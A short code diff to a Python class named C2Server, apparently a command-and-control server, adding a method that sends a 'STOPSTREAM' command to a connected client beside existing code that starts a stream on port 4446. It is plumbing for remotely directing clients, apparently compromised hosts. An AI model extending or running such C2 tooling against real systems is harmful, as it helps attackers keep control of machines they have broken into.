@@ -1,6 +1,7 @@
 import socket
 import threading
 import time
+
 from server_core.logging import Logger
 from server_core.heartbeat import heartbeat_sender
 from server_core.acceptor import accept_loop
@@ -99,6 +100,18 @@ class C2Server:
             try:
                 target.cmd_socket.send(('STREAM|4446' + '\n').encode())
                 target.set_time(time.time())
+            except Exception:
+                target.close()
+
+    def stop_stream(self, uid_prefix):
+        target = self.find_client_by_prefix(uid_prefix)
+        if not target:
+            self.log("[ERR] Client not found or ambiguous")
+            return
+
+        with target.lock:
+            try:
+                target.cmd_socket.send(('STOPSTREAM' + '\n').encode())
             except Exception:
                 target.close()
 
